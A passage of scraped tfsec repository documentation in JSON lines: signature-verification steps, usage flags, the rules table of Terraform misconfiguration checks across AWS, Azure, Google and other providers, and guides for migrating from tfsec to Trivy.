t41fOSyyagZhWoR05JbaY4+yfhjx\nFkM0ly4XGasTbjJpwbJKWtXwiLXNaCCzQJH1DBdh5O3lHIidqcdoi+iAcpgaJCXI\np297ny/7PTHmTaZhdjGcBp2tAmd+J0zgsmNk3qUg5pPGKdUnCA5jjENfmTMP4ets\nnX5QmAEwF/nBYV3Du7TIvHtz91yL8A==\n=opqY\n-----END PGP PUBLIC KEY BLOCK-----\n```\n\n#### Steps for Verification\n\n\n1. Copy the public key block into a new file, eg; /tmp/tfsec_key.txt\n   \n2. Import the gpg key\n   ```\n    gpg --import < /tmp/tfsec_key.txt\n   ```\n3. Verify that the key has been imported\n    ```\n    gpg --list-keys signing@tfsec.dev\n    ```\n    check the output is\n    ```\n    pub  rsa4096 2021-05-20 [SC]       D66B222A3EA4C25D5D1A097FC34ACEFB46EC39CE\n    uid  [ultimate] Tfsec Signing (Code signing for tfsec) <signing@tfsec.dev>\n    sub  rsa4096 2021-05-20 [E]\n    ```\n4. Download the required binary and its associated sig file\n   \n5. Assuming it is `tfsec-linux-amd64` the verify command below should be run, passing in the sig file then the binary file\n   ```\n   gpg --verify tfsec-linux-amd64.D66B222A3EA4C25D5D1A097FC34ACEFB46EC39CE.sig tfsec-linux-amd64\n   ```\n   This should give you a similar output to that below - the key part is that it is signed and has a `Good signature`\n   ```\n   gpg: Signature made Fri 09 Jul 2021 11:41:22 BST\n   gpg:                using RSA key D66B222A3EA4C25D5D1A097FC34ACEFB46EC39CE\n   gpg: Good signature from \"Tfsec Signing (Code signing for tfsec) <signing@tfsec.dev>\" [ultimate]\n\n   ```", "timestamp": "2025-10-24T22:25:29.905412"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/guides/trivy.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/guides/trivy.md", "content": "# Moving towards configuration scanning with Trivy\nOvertime we've taken [trivy][trivy] to be the go-to scanning tool for a variety of things. This also includes terraform scanning.\n\nThis section describes some differences between Trivy and tfsec.\n\n| Feature              | Trivy                                                  | tfsec                |\n|----------------------|--------------------------------------------------------|----------------------|\n| Policy Distribution | Embedded and Updated via Registry                      | Embedded             |\n| Custom Policies      | Rego                                                   | Rego, JSON, and YAML |\n| Supported Formats    | Dockerfile, JSON, YAML, Terraform, CloudFormation etc. | Terraform  Only      |\n\n\n# Comparison with examples\n## Simple scan\n### With Trivy\n```shell\n$ trivy config <dir>\n```\n### With tfsec\n```shell\n$ tfsec <dir>\n```\n\n## Passing tfvars\n### With Trivy\n```shell\n$ trivy --tf-vars <vars.tf> <dir>\n```\n### With tfsec\n```shell\n$ tfsec <dir> --tf-vars-file <vars.tf>\n```\n\n## Report formats\n### With Trivy\n```shell\n$ trivy config --format <format-type> <dir>\n```\n\n### With tfsec\n```shell\n$ tfsec <dir> --format <format-type>\n```\n\nWe welcome any feedback if you find features that today are not available with Trivy misconfigration scanning that are available in tfsec. \n\n[trivy]: https://github.com/aquasecurity/trivy\n", "timestamp": "2025-10-24T22:25:30.015849"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/guides/usage.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/guides/usage.md", "content": "---\ntitle: Usage\ndescription: Usage\nsubtitle: Using tfsec\ndescription: Using tfsec\nauthor: tfsec\ntags: [installation, quickstart]\n---\n\ntfsec can be run with no arguments and will act on the current folder.\n\nFor a richer experience, there are many additional command line arguments that you can make use of.\n\n| Argument                       | Short Code | Description                                                                                                                                                                                                                                                                                |\n|:-------------------------------|:-----------|:-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| `--code-theme string`          |            | Theme for annotated code. Either 'light' or 'dark'. (default \"dark\")                                                                                                                                                                                                                       |\n| `--concise-output    `         |            | Reduce the amount of output and no statistics                                                                                                                                                                                                                                              |\n| `--config-file string `        |            | Config file to use during run                                                                                                                                                                                                                                                              |\n| `--config-file-url string `    |            | Config file to download from a remote location. Must be json or yaml                                                                                                                                                                                                                       |\n| `--custom-check-dir string`    |            | Explicitly the custom checks dir location                                                                                                                                                                                                                                                  |\n| `--custom-check-url string`    |            |Download a custom check file from a remote location. Must be json or yaml                                                                                                                                                                                                                   |\n| `--debug`                      |            | Enable debug logging (same as verbose)                                                                                                                                                                                                                                                     |\n| `--disable-grouping`           | `-G`       | Disable grouping of similar results                                                                                                                                                                                                                                                        |\n| `--exclude string`             | `-e`       | Provide comma-separated list of rule IDs to exclude from run.                                                                                                                                                                                                                              |\n| `--exclude-downloaded-modules` |            | Remove results for downloaded modules in .terraform folder                                                                                                                                                                                                                                 |\n| `--exclude-path strings`       |            | Folder path to exclude, can be used multiple times and evaluated in order of specification                                                                                                                                                                                                 |\n| `--filter-results string`      |            | Filter results to return specific checks only (supports comma-delimited input).                                                                                                                                                                                                            |\n| `--force-all-dirs`             |            | Don't search for tf files, include everything below provided directory.                                                                                                                                                                                                                    |\n| `--format string`              | `-f`       | Select output format: lovely, json, csv, checkstyle, junit, sarif, text, markdown, html, gif. To use multiple formats, separate with a comma and specify a base output filename with --out. A file will be written for each type. The first format will additionally be written stdout. (default \"lovely\") |\n| `--help`                       | `-h`       | help for tfsec                                                                                                                                                                                                                                                                             |\n| `--ignore-hcl-errors`          |            | Do not report an error if an HCL parse error is encountered                                                                                                                                                                                                                                |\n| `--include-ignored  `          |            | Include ignored checks in the result output                                                                                                                                                                                                                                                |\n| `--include-passed`             |            | Include passed checks in the result output                                                                                                                                                                                                                                                 |\n| `--migrate-ignores`            |            | Migrate ignore codes to the new ID structure                                                                                                                                                                                                                                               |\n| `--minimum-severity string`    | `-m`       | The minimum severity to report. One of CRITICAL, HIGH, MEDIUM, LOW.                                                                                                                                                                                                                        |\n| `--no-code`                    |            | Don't include the code snippets in the output.                                                                                                                                                                                                                                             |\n| `--no-color`                   |            | Disable colored output (American style!)                                                                                                                                                                                                                                                   |\n| `--no-colour`                  |            | Disable coloured output                                                                                                                                                                                                                                                                    |\n| `--no-ignores`                 |            | Do not apply any ignore rules - normally ignored checks will fail                                                                                                                                                                                                                          |\n| `--no-module-downloads`        |            | Do not download remote modules.                                                                                                                                                                                                                                                            |\n| `--out string`                 | `-O`       | Set output file. This filename will have a format descriptor appended if multiple formats are specified with --format                                                                                                                                                                      |\n| `--print-rego-input`           |            | Print a JSON representation of the input supplied to rego policies.                                                                                                                                                                                                                        |\n| `--rego-only`                  |            | Run rego policies exclusively.                                                                                                                                                                                                                                                             |\n| `--rego-policy-dir string`     |            | Directory to load rego policies from (recursively).                                                                                                                                                                                                                                        |\n| `--run-statistics`             |            | View statistics table of current findings.                                                                                                                                                                                                                                                 |\n| `--single-thread`              |            | Run checks using a single thread                                                                                                                                                                                                                                                           |\n| `--soft-fail`                  | `-s`       | Runs checks but suppresses error code                                                                                                                                                                                                                                                      |\n| `--tfvars-file strings`        |            | Path to .tfvars file, can be used multiple times and evaluated in order of specification                                                                                                                                                                                                   |\n| `--update`                     |            | Update to latest version                                                                                                                                                                                                                                                                   |\n| `--var-file strings`           |            | Path to .tfvars file, can be used multiple times and evaluated in order of specification (same functionality as --tfvars-file but consistent with Terraform)                                                                                                                              |\n| `--verbose`                    |            | Enable verbose logging (same as debug)                                                                                                                                                                                                                                                     |\n| `--version`                    | `-v`       | Show version information and exit                                                                                                                                                                                                                                                          |\n| `--workspace string`           | `-w`       | Specify a workspace for ignore limits (default \"default\")                                                                                                                                                                                                                                  |\n\n\nThis list can also be found by running `tfsec --help`\n", "timestamp": "2025-10-24T22:25:30.117470"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/index.md", "content": "---\nhide:\n- navigation\n- toc\n---\n\n![logo](imgs/homelogo.png)\n\n<br/>\n<br/>\n\n## 📣 tfsec to Trivy Migration\n\nAs part of our goal to provide a comprehensive open source security solution for all, we have been consolidating all of our scanning-related efforts in one place, and that is [Trivy](https://github.com/aquasecurity/trivy). \n\nOver the past year, tfsec has laid the foundations to Trivy's IaC & misconfigurations scanning capabilities, including Terraform scanning, which has been natively supported in Trivy for a long time now.\n\nGoing forward we want to encourage the tfsec community to transition over to Trivy. Moving to Trivy gives you the same excellent Terraform scanning engine, with some extra benefits:\n\n1. Access to more languages and features in the same tool.\n2. Access to more integrations with tools and services through the rich ecosystem around Trivy.\n3. Commercially supported by Aqua as well as by a the passionate Trivy community.\ntfsec will continue to remain available for the time being, although our engineering attention will be directed at Trivy going forward.\n\n## tfsec to Trivy migration guide\n\nFor further information on how Trivy compares to tfsec and moving from tfsec to Trivy, do have a look at the [migration guide.](https://github.com/aquasecurity/tfsec/blob/master/tfsec-to-trivy-migration-guide.md)\n\n## tfsec\n\n`tfsec` is a static analysis security scanner for your Terraform code.\n\nDesigned to run locally and in your CI pipelines, developer-friendly output and fully documented checks mean detection and remediation can take place as quickly and efficiently as possible\n\n`tfsec` takes a developer-first approach to scanning your Terraform templates; using static analysis and deep integration with the official HCL parser it ensures that security issues can be detected before your infrastructure changes take effect.\n\n<br/>\n<br/>\n\n\n<figure style=\"text-align: center\">\n  <img src=\"imgs/demo.gif\" width=\"1000\">\n  <figcaption>Demo: Misconfiguration Detection</figcaption>\n</figure>\n\n`tfsec` is an [Aqua Security][aquasec] open source project.  \nLearn about our open source work and portfolio [here][oss].  \nContact us about any matter by opening a GitHub Discussion [here][discussions]\n\n\n[aquasec]: https://aquasec.com\n[oss]: https://www.aquasec.com/products/open-source-projects/\n[discussions]: https://github.com/aquasecurity/tfsec/discussions\n", "timestamp": "2025-10-24T22:25:30.391047"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "rules.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/rules.md", "content": "| ID | Provider | Service | Description|\n|-|-|-|-|\n| aws-s3-no-public-access-with-acl | aws | s3 | S3 Bucket has an ACL defined which allows public access. |\n| aws-s3-enable-bucket-logging | aws | s3 | S3 Bucket does not have logging enabled. |\n| aws-rds-no-classic-resources | aws | rds | AWS Classic resource usage. |\n| aws-elbv2-http-not-used | aws | elbv2 | Use of plain HTTP. |\n| aws-elbv2-alb-not-public | aws | elbv2 | Load balancer is exposed to the internet. |\n| aws-vpc-no-public-ingress-sgr | aws | vpc | An ingress security group rule allows traffic from /0. |\n| aws-vpc-no-public-egress-sgr | aws | vpc | An egress security group rule allows traffic to /0. |\n| aws-vpc-no-public-ingress-sg | aws | vpc | An inline ingress security group rule allows traffic from /0. |\n| aws-vpc-no-public-egress-sg | aws | vpc | An inline egress security group rule allows traffic to /0. |\n| aws-vpc-use-secure-tls-policy | aws | vpc | An outdated SSL policy is in use by a load balancer. |\n| aws-rds-no-public-db-access | aws | rds | A database resource is marked as publicly accessible. |\n| aws-autoscaling-no-public-ip | aws | autoscaling | A resource has a public IP address. |\n| aws-ecs-no-plaintext-secrets | aws | ecs | Task definition defines sensitive environment variable(s). |\n| aws-autoscaling-enable-at-rest-encryption | aws | autoscaling | Launch configuration with unencrypted block device. |\n| aws-sqs-enable-queue-encryption | aws | sqs | Unencrypted SQS queue. |\n| aws-sns-enable-topic-encryption | aws | sns | Unencrypted SNS topic. |\n| aws-s3-enable-bucket-encryption | aws | s3 | Unencrypted S3 bucket. |\n| aws-vpc-add-description-to-security-group | aws | vpc | Missing description for security group/security group rule. |\n| aws-kms-auto-rotate-keys | aws | kms | A KMS key is not configured to auto-rotate. |\n| aws-cloudfront-enforce-https | aws | cloudfront | CloudFront distribution allows unencrypted (HTTP) communications. |\n| aws-cloudfront-use-secure-tls-policy | aws | cloudfront | CloudFront distribution uses outdated SSL/TLS protocols. |\n| aws-msk-enable-in-transit-encryption | aws | msk | A MSK cluster allows unencrypted data in transit. |\n| aws-ecr-enable-image-scans | aws | ecr | ECR repository has image scans disabled. |\n| aws-kinesis-enable-in-transit-encryption | aws | kinesis | Kinesis stream is unencrypted. |\n| aws-api-gateway-use-secure-tls-policy | aws | api-gateway | API Gateway domain name uses outdated SSL/TLS protocols. |\n| aws-elastic-service-enable-domain-encryption | aws | elastic-service | Elasticsearch domain isn't encrypted at rest. |\n| aws-elastic-search-enable-in-transit-encryption | aws | elastic-search | Elasticsearch domain uses plaintext traffic for node to node communication. |\n| aws-elastic-search-enforce-https | aws | elastic-search | Elasticsearch doesn't enforce HTTPS traffic. |\n| aws-elastic-search-use-secure-tls-policy | aws | elastic-search | Elasticsearch domain endpoint is using outdated TLS policy. |\n| aws-elastic-search-encrypt-replication-group | aws | elastic-search | Unencrypted Elasticache Replication Group. |\n| aws-elasticache-enable-in-transit-encryption | aws | elasticache | Elasticache Replication Group uses unencrypted traffic. |\n| aws-iam-no-password-reuse | aws | iam | IAM Password policy should prevent password reuse. |\n| aws-iam-set-max-password-age | aws | iam | IAM Password policy should have expiry less than or equal to 90 days. |\n| aws-iam-set-minimum-password-length | aws | iam | IAM Password policy should have minimum password length of 14 or more characters. |\n| aws-iam-require-symbols-in-passwords | aws | iam | IAM Password policy should have requirement for at least one symbol in the password. |\n| aws-iam-require-numbers-in-passwords | aws | iam | IAM Password policy should have requirement for at least one number in the password. |\n| aws-iam-require-lowercase-in-passwords | aws | iam | IAM Password policy should have requirement for at least one lowercase character. |\n| aws-iam-require-uppercase-in-passwords | aws | iam | IAM Password policy should have requirement for at least one uppercase character. |\n| aws-misc-no-exposing-plaintext-credentials | aws | misc | AWS provider has access credentials specified. |\n| aws-cloudfront-enable-waf | aws | cloudfront | CloudFront distribution does not have a WAF in front. |\n| aws-sqs-no-wildcards-in-policy-documents | aws | sqs | AWS SQS policy document has wildcard action statement. |\n| aws-efs-enable-at-rest-encryption | aws | efs | EFS Encryption has not been enabled |\n| aws-vpc-no-public-ingress | aws | vpc | An ingress Network ACL rule allows specific ports from /0. |\n| aws-vpc-no-excessive-port-access | aws | vpc | An ingress Network ACL rule allows ALL ports. |\n| aws-rds-encrypt-cluster-storage-data | aws | rds | There is no encryption specified or encryption is disabled on the RDS Cluster. |\n| aws-rds-encrypt-instance-storage-data | aws | rds | RDS encryption has not been enabled at a DB Instance level. |\n| aws-rds-enable-performance-insights | aws | rds | Encryption for RDS Performance Insights should be enabled. |\n| aws-elastic-search-enable-domain-logging | aws | elastic-search | Domain logging should be enabled for Elastic Search domains |\n| aws-lambda-restrict-source-arn | aws | lambda | Ensure that lambda function permission has a source arn specified |\n| aws-athena-enable-at-rest-encryption | aws | athena | Athena databases and workgroup configurations are created unencrypted at rest by default, they should be encrypted |\n| aws-athena-no-encryption-override | aws | athena | Athena workgroups should enforce configuration to prevent client disabling encryption |\n| aws-api-gateway-enable-access-logging | aws | api-gateway | API Gateway stages for V1 and V2 should have access logging enabled |\n| aws-ec2-no-secrets-in-user-data | aws | ec2 | User data for EC2 instances must not contain sensitive AWS keys |\n| aws-cloudtrail-enable-all-regions | aws | cloudtrail | Cloudtrail should be enabled in all regions regardless of where your AWS resources are generally homed |\n| aws-cloudtrail-enable-log-validation | aws | cloudtrail | Cloudtrail log validation should be enabled to prevent tampering of log data |\n| aws-cloudtrail-enable-at-rest-encryption | aws | cloudtrail | Cloudtrail should be encrypted at rest to secure access to sensitive trail data |\n| aws-eks-encrypt-secrets | aws | eks | EKS should have the encryption of secrets enabled |\n| aws-eks-enable-control-plane-logging | aws | eks | EKS Clusters should have cluster control plane logging turned on |\n| aws-eks-no-public-cluster-access-to-cidr | aws | eks | EKS cluster should not have open CIDR range for public access |\n| aws-eks-no-public-cluster-access | aws | eks | EKS Clusters should have the public access disabled |\n| aws-elastic-search-enable-logging | aws | elastic-search | AWS ES Domain should have logging enabled |\n| aws-cloudfront-enable-logging | aws | cloudfront | Cloudfront distribution should have Access Logging configured |\n| aws-s3-ignore-public-acls | aws | s3 | S3 Access Block should Ignore Public Acl |\n| aws-s3-block-public-acls | aws | s3 | S3 Access block should block public ACL |\n| aws-s3-no-public-buckets | aws | s3 | S3 Access block should restrict public bucket to limit access |\n| aws-s3-block-public-policy | aws | s3 | S3 Access block should block public policy |\n| aws-s3-enable-versioning | aws | s3 | S3 Data should be versioned |\n| aws-ecr-enforce-immutable-repository | aws | ecr | ECR images tags shouldn't be mutable. |\n| aws-ec2-enforce-http-token-imds | aws | ec2 | aws_instance should activate session tokens for Instance Metadata Service. |\n| aws-codebuild-enable-encryption | aws | codebuild | CodeBuild Project artifacts encryption should not be disabled |\n| aws-dynamodb-enable-at-rest-encryption | aws | dynamodb | DAX Cluster should always encrypt data at rest |\n| aws-vpc-no-default-vpc | aws | vpc | AWS best practice to not use the default VPC for workflows |\n| aws-elb-drop-invalid-headers | aws | elb | Load balancers should drop invalid headers |\n| aws-workspace-enable-disk-encryption | aws | workspace | Root and user volumes on Workspaces should be encrypted |\n| aws-config-aggregate-all-regions | aws | config | Config configuration aggregator should be using all regions for source |\n| aws-dynamodb-enable-recovery | aws | dynamodb | Point in time recovery should be enabled to protect DynamoDB table |\n| aws-redshift-non-default-vpc-deployment | aws | redshift | Redshift cluster should be deployed into a specific VPC |\n| aws-elasticache-enable-backup-retention | aws | elasticache | Redis cluster should have backup retention turned on |\n| aws-cloudwatch-log-group-customer-key | aws | cloudwatch | CloudWatch log groups should be encrypted using CMK |\n| aws-ecs-enable-container-insight | aws | ecs | ECS clusters should have container insights enabled |\n| aws-rds-backup-retention-specified | aws | rds | RDS Cluster and RDS instance should have backup retention longer than default 1 day |\n| aws-dynamodb-table-customer-key | aws | dynamodb | DynamoDB tables should use at rest encryption with a Customer Managed Key |\n| aws-ecr-repository-customer-key | aws | ecr | ECR Repository should use customer managed keys to allow more control |\n| aws-redshift-encryption-customer-key | aws | redshift | Redshift clusters should use at rest encryption |\n| aws-ssm-secret-use-customer-key | aws | ssm | Secrets Manager should use customer managed keys |\n| aws-ecs-enable-in-transit-encryption | aws | ecs | ECS Task Definitions with EFS volumes should use in-transit encryption |\n| aws-iam-block-kms-policy-wildcard | aws | iam | IAM customer managed policies should not allow decryption actions on all KMS keys |\n| aws-s3-specify-public-access-block | aws | s3 | S3 buckets should each define an aws_s3_bucket_public_access_block |\n| aws-iam-no-policy-wildcards | aws | iam | IAM policy should avoid use of wildcards and instead apply the principle of least privilege |\n| azure-network-no-public-ingress | azure | network | An inbound network security rule allows traffic from /0. |\n| azure-network-no-public-egress | azure | network | An outbound network security rule allows traffic to /0. |\n| azure-compute-enable-disk-encryption | azure | compute | Unencrypted managed disk. |\n| azure-datalake-enable-at-rest-encryption | azure | datalake | Unencrypted data lake storage. |\n| azure-compute-ssh-authentication | azure | compute | Password authentication in use instead of SSH keys. |\n| azure-container-configured-network-policy | azure | container | Ensure AKS cluster has Network Policy configured |\n| azure-container-use-rbac-permissions | azure | container | Ensure RBAC is enabled on AKS clusters |\n| azure-container-limit-authorized-ips | azure | container | Ensure AKS has an API Server Authorized IP Ranges enabled |\n| azure-container-logging | azure | container | Ensure AKS logging to Azure Monitoring is Configured |\n| azure-storage-ensure-https | azure | storage | Ensure HTTPS is enabled on Azure Storage Account |\n| azure-storage-no-public-access | azure | storage | Storage containers in blob storage mode should not have public access |\n| azure-storage-default-action-deny | azure | storage | The default action on Storage account network rules should be set to deny |\n| azure-storage-allow-microsoft-service-bypass | azure | storage | Trusted Microsoft Services should have bypass access to Storage accounts |\n| azure-storage-enforce-https | azure | storage | Storage accounts should be configured to only accept transfers that are over secure connections |\n| azure-storage-use-secure-tls-policy | azure | storage | The minimum TLS version for Storage Accounts should be TLS1_2 |\n| azure-storage-queue-services-logging-enabled | azure | storage | When using Queue Services for a storage account, logging should be enabled. |\n| azure-network-ssh-blocked-from-internet | azure | network | SSH access should not be accessible from the Internet, should be blocked on port 22 |\n| azure-database-enable-audit | azure | database | Auditing should be enabled on Azure SQL Databases |\n| azure-database-retention-period-set | azure | database | Database auditing retention period should be longer than 90 days |\n| azure-keyvault-specify-network-acl | azure | keyvault | Key vault should have the network acl block specified |\n| azure-keyvault-no-purge | azure | keyvault | Key vault should have purge protection enabled |\n| azure-keyvault-content-type-for-secret | azure | keyvault | Key vault Secret should have a content type set |\n| azure-keyvault-ensure-secret-expiry | azure | keyvault | Key Vault Secret should have an expiration date set |\n| azure-network-disable-rdp-from-internet | azure | network | RDP access should not be accessible from the Internet, should be blocked on port 3389 |\n| azure-datafactory-no-public-access | azure | datafactory | Data Factory should have public access disabled, the default is enabled. |\n| azure-keyvault-ensure-key-expiry | azure | keyvault | Ensure that the expiration date is set on all keys |\n| azure-synapse-virtual-network-enabled | azure | synapse | Synapse Workspace should have managed virtual network enabled, the default is disabled. |\n| azure-appservice-enforce-https | azure | appservice | Ensure the Function App can only be accessed via HTTPS. The default is false. |\n| azure-functionapp-authentication-enabled | functionapp | Ensure the Function App has authentication enabled. The default is false. |\n| azure-securitycenter-defender-on-appservices | securitycenter | Ensure Defender is enabled for AppServices. |\n| azure-securitycenter-defender-on-container-registry | securitycenter | Ensure Defender is enabled for ContainerRegistry. |\n| azure-securitycenter-defender-on-keyvault | securitycenter | Ensure Defender is enabled for KeyVault. |\n| azure-securitycenter-defender-on-kubernetes | securitycenter | Ensure Defender is enabled for Kubernetes. |\n| azure-securitycenter-defender-on-servers | securitycenter | Ensure Defender is enabled for VirtualMachines. |\n| azure-securitycenter-defender-on-sql-servers | securitycenter | Ensure Defender is enabled for SqlServers. |\n| azure-securitycenter-defender-on-sql-servers-vms | securitycenter | Ensure Defender is enabled for SqlServersVirtualMachines. |\n| azure-securitycenter-defender-on-storage | securitycenter | Ensure Defender is enabled for StorageAccounts. |\n| digitalocean-compute-no-public-ingress | digitalocean | compute | The firewall has an inbound rule with open access |\n| digitalocean-compute-no-public-egress | digitalocean | compute | The firewall has an outbound rule with open access |\n| digitalocean-droplet-use-ssh-keys | digitalocean | droplet | SSH Keys are the preferred way to connect to your droplet, no keys are supplied |\n| digitalocean-loadbalancing-enforce-https | digitalocean | loadbalancing | The load balancer forwarding rule is using an insecure protocol as an entrypoint |\n| digitalocean-spaces-acl-no-public-read | digitalocean | spaces | Spaces bucket or bucket object has public read acl set |\n| digitalocean-spaces-versioning-enabled | digitalocean | spaces | Spaces buckets should have versioning enabled |\n| digitalocean-spaces-disable-force-destroy | digitalocean | spaces | Force destroy is enabled on Spaces bucket which is dangerous |\n| google-compute-disk-encryption-customer-keys | google | compute | Encrypted compute disk with unmanaged keys. |\n| google-compute-no-public-ingres | google | compute | An inbound firewall rule allows traffic from /0. |\n| google-compute-no-public-egress | google | compute | An outbound firewall rule allows traffic to /0. |\n| google-gke-use-rbac-permissions | google | gke | Legacy ABAC permissions are enabled. |\n| google-gke-node-metadata-security | google | gke | Node metadata value disables metadata concealment. |\n| google-gke-metadata-endpoints-disabled | google | gke | Legacy metadata endpoints enabled. |\n| google-gke-no-legacy-authentication | google | gke | Legacy client authentication methods utilized. |\n| google-gke-enforce-pod-security-policy | google | gke | Pod security policy enforcement not defined. |\n| google-gke-node-shielding-enabled | google | gke | Shielded GKE nodes not enabled. |\n| google-iam-no-user-granted-permissions | google | iam | IAM granted directly to user. |\n| google-gke-use-service-account | google | gke | Checks for service account defined for GKE nodes |\n| google-compute-disk-encryption-required | google | compute | The encryption key used to encrypt a compute disk has been specified in plaintext. |\n| general-secrets-sensitive-in-variable | general | secrets | Potentially sensitive data stored in \"default\" value of variable. |\n| general-secrets-sensitive-in-local | general | secrets | Potentially sensitive data stored in local value. |\n| general-secrets-sensitive-in-attribute | general | secrets | Potentially sensitive data stored in block attribute. |\n| general-secrets-sensitive-in-attribute-value | general | secrets | The attribute has potentially sensitive data, passwords, tokens or keys in it |\n| general-secrets-no-plaintext-exposure | general | secrets | The plain text has potentially sensitive data, passwords, tokens or keys in it |\n| github-repositories-private | github | repositories | Github repository shouldn't be public. |\n| oracle-compute-no-public-ip | oracle | compute | Compute instance requests an IP reservation from a public pool |\n", "timestamp": "2025-10-24T22:25:34.153531"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "tfsec-to-trivy-migration-guide.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/tfsec-to-trivy-migration-guide.md", "content": "# Migrating from tfsec to Trivy\nOvertime we've taken [Trivy][trivy] to be the go-to scanning tool for a variety of things. This also includes terraform scanning. For further information, have a look at the announcement [\"tfsec is joining the Trivy family\".](https://github.com/aquasecurity/tfsec/discussions/1994)\n\n### Main differences between Trivy and tfsec\n\nTrivy's design keeps misconfiguration up to date automatically. New misconfiguration are updated in Trivy by pulling from the Container Registry. The embedded misconfiguration in Trivy are only used if Trivy cannot pull from the remote registry. See the [following documentation](https://aquasecurity.github.io/trivy/v0.41/docs/scanner/misconfiguration/policy/builtin/#policy-distribution) for further details.\n\n## Comparison with examples\n### Simple scan\n#### With Trivy\n```shell\n$ trivy config <dir>\n```\n#### With tfsec\n```shell\n$ tfsec <dir>\n```\n\nThe documentation can be found in Trivy under the [following link.](https://aquasecurity.github.io/trivy/latest/docs/scanner/misconfiguration/)\n\n### Passing tfvars\n#### With Trivy\n```shell\n$ trivy --tf-vars <vars.tf> <dir>\n```\n#### With tfsec\n```shell\n$ tfsec <dir> --tf-vars-file <vars.tf>\n```\n\nThe documentation can be found in Trivy under the [following link.](https://aquasecurity.github.io/trivy/v0.41/docs/scanner/misconfiguration/#terraform-value-overrides)\n\n### Report formats\n#### With Trivy\n```shell\n$ trivy config --format <format-type> <dir>\n```\n\n#### With tfsec\n```shell\n$ tfsec <dir> --format <format-type>\n```\n\nThe documentation can be found in Trivy under the [following link.](https://aquasecurity.github.io/trivy/v0.41/docs/configuration/reporting/)\n\n## FAQs\n\n**Does Trivy support junit?**\n\nYes, Trivy supports different report templates. These can either be set, loaded through a file or by providing a default template such as for JUnit. \n\nFor more information, please [the documentation.](https://aquasecurity.github.io/trivy/v0.41/docs/configuration/reporting/#junit)\n\n**Does Trivy support multiple outputs?**\n\nCurrently, the following outputs are supported by Trivy:\n\n* Table\n* JSON\n* SARIF\n* Template\n* SBOM\n\ne.g.\n```\ntrivy config --output report.json --format json ./bad_iac/docker\n```\nThis will saver the json report into a `report.json` file.\n\n[Documentation](https://aquasecurity.github.io/trivy/v0.41/docs/configuration/reporting/)\n\nNote that one report can be generated per scan. However, if you require multiple different reports, the same scan would pull the information from the cache to generate a new report format.\n\n**Can Trivy skip files?**\n\nYes, you can specify that Trivy should skip a directory, using the following flag `--skip-dirs`.\n\n[Documentation](https://aquasecurity.github.io/trivy/v0.41/docs/configuration/others/)\n\nAlternatively, it is possible to skip files, using this flag `--skip-files`.\n\n[Documentation](https://aquasecurity.github.io/trivy/v0.41/docs/configuration/others/#skip-files)\n\n## Feedback\n\nWe welcome any feedback if you find features that today are not available with Trivy misconfigration scanning that are available in tfsec. \n\nFor further information on scanning terraform with Trivy, do have a look at the [Trivy Terraform Guide](https://aquasecurity.github.io/trivy/latest/tutorials/terraform/scannig/).\n\n[trivy]: https://github.com/aquasecurity/trivy\n", "timestamp": "2025-10-24T22:25:41.055717"}
